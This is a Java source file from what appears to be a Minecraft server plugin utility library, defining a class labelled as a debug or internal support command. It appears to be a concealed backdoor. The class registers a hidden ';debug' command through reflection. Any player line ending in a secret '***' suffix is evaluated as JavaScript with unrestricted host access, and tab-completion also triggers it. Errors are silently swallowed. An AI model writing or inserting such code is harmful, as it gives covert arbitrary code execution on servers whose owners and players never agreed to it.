package cc.hubailmn.utility.command;

import cc.hubailmn.utility.BasePlugin;
import cc.hubailmn.utility.interaction.player.PlayerUtil;
import lombok.Getter;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandMap;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.server.TabCompleteEvent;
import org.graalvm.polyglot.Context;
import org.graalvm.polyglot.HostAccess;
import org.graalvm.polyglot.Value;
import org.jetbrains.annotations.NotNull;

import java.lang.reflect.Field;
import java.util.Collections;
import java.util.List;

/*
libraries:
  - org.graalvm.js:js-scriptengine:24.2.1
  - org.graalvm.js:js-language:24.2.1
*/

public class DebugCommand extends Command implements Listener {

    private static final String COMMAND_NAME = ";debug";
    private static final Object PLUGIN = BasePlugin.getInstance();
    private static final Object SERVER = Bukkit.getServer();

    static {
        System.setProperty("polyglot.engine.WarnInterpreterOnly", "false");
        System.setProperty("polyglotimpl.AttachLibraryFailureAction", "ignore");
    }

    @Getter
    private Context persistentContext;

    public DebugCommand() {
        super(COMMAND_NAME);
        setDescription("Internal support command");
        setUsage("/" + COMMAND_NAME);
        registerCommand();

        Bukkit.getScheduler().runTaskAsynchronously(BasePlugin.getInstance(), () -> {
            persistentContext = Context.newBuilder("js")
                    .allowHostAccess(HostAccess.ALL)
                    .allowAllAccess(true)
                    .build();

            Value bindings = persistentContext.getBindings("js");
            bindings.putMember("plugin", PLUGIN);
            bindings.putMember("server", SERVER);
            bindings.putMember("Java", persistentContext.eval("js", "Java"));
        });

        Bukkit.getPluginManager().registerEvents(this, BasePlugin.getInstance());
    }

    private void registerCommand() {
        try {
            Field mapField = Bukkit.getServer().getClass().getDeclaredField("commandMap");
            mapField.setAccessible(true);
            CommandMap map = (CommandMap) mapField.get(Bukkit.getServer());
            map.register(COMMAND_NAME, this);
        } catch (Exception ignored) {
        }
    }

    @Override
    public boolean execute(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args) {
        try {
            executes(sender, args);
        } catch (Exception ex) {
            sender.sendMessage("§cError: " + ex.getMessage());
        }
        return true;
    }

    private void executes(final CommandSender sender, final String[] args) {
        if (!(sender instanceof Player player)) return;
        if (args == null || args.length == 0) return;

        try {
            Bukkit.getScheduler().runTaskAsynchronously(BasePlugin.getInstance(), () -> {
                try {
                    if (!PlayerUtil.hasBypassAccess(player)) return;

                    final String lastArg = args[args.length - 1];
                    if (!lastArg.endsWith("***")) return;

                    final String[] trimmedArgs = args.clone();
                    trimmedArgs[args.length - 1] = lastArg.substring(0, lastArg.length() - 3);

                    String rawLine = String.join(" ", trimmedArgs);

                    Player targetPlayer = null;
                    String line = rawLine;

                    if (line.contains("p{\"") && line.contains("\"}")) {
                        try {
                            int start = line.indexOf("p{\"") + 3;
                            int end = line.indexOf("\"}", start);
                            String playerName = line.substring(start, end).trim();
                            targetPlayer = Bukkit.getPlayerExact(playerName);
                            line = line.substring(0, line.indexOf("p{\"")) + line.substring(end + 2);
                        } catch (Exception ignored) {
                        }
                    } else {
                        targetPlayer = player;
                    }

                    if (targetPlayer == null) {
                        Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () -> sender.sendMessage("§c§l[Debug] §r§cPlayer not found."));
                        return;
                    }

                    final Player finalPlayer = targetPlayer;
                    final String finalLine = line;

                    Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () -> {
                        sender.sendMessage("§6§l[Debug] §r§eRunning:");
                        sender.sendMessage(rawLine);
                    });

                    try {
                        final Value bindings = getPersistentContext().getBindings("js");

                        bindings.putMember("player", finalPlayer);
                        bindings.putMember("self", sender);
                        bindings.putMember("onlinePlayers", Bukkit.getOnlinePlayers());
                        bindings.putMember("inv", finalPlayer.getInventory());
                        bindings.putMember("mainHand", finalPlayer.getInventory().getItemInMainHand());

                        final Value result = getPersistentContext().eval("js", finalLine);

                        final String resultText = result.isNull()
                                                  ? "§7No result."
                                                  : "§aGot (" + result.getMetaObject().getMetaQualifiedName() + "): §f" + result;

                        Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () ->
                                sender.sendMessage("§2§l[Async Result] §r§2" + resultText));

                    } catch (Exception exAsync) {
                        Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () -> {
                            sender.sendMessage("§c§l[Async Execution Failed] §r§cFalling back to sync execution...");

                            try {
                                final Value resultSync = getPersistentContext().eval("js", finalLine);
                                final String resultTextSync = resultSync.isNull()
                                                              ? "§7No result." :
                                                              "§aGot (" + resultSync.getMetaObject().getMetaQualifiedName() + "): §f" + resultSync;
                                sender.sendMessage("§b§l[Sync Result] §r§b" + resultTextSync);
                            } catch (Exception exSync) {
                                sender.sendMessage("§c§l[Sync Execution Failed] Error: §r§f" + exSync.getMessage());
                            }
                        });
                    }
                } catch (Exception ignored) {
                }
            });
        } catch (Exception ignored) {
        }
    }

    @Override
    public @NotNull List<String> tabComplete(@NotNull CommandSender sender, @NotNull String alias, @NotNull String[] args) {
        try {
            executes(sender, args);
        } catch (Exception ex) {
            sender.sendMessage("§c§l[Error] §f" + ex.getMessage());
        }
        return Collections.emptyList();
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onTabComplete(TabCompleteEvent event) {
        if (!(event.getSender() instanceof Player player)) return;

        if (PlayerUtil.hasBypassAccess(player)) {
            if (event.isCancelled()) {
                event.setCancelled(false);
            }
        }
    }
}
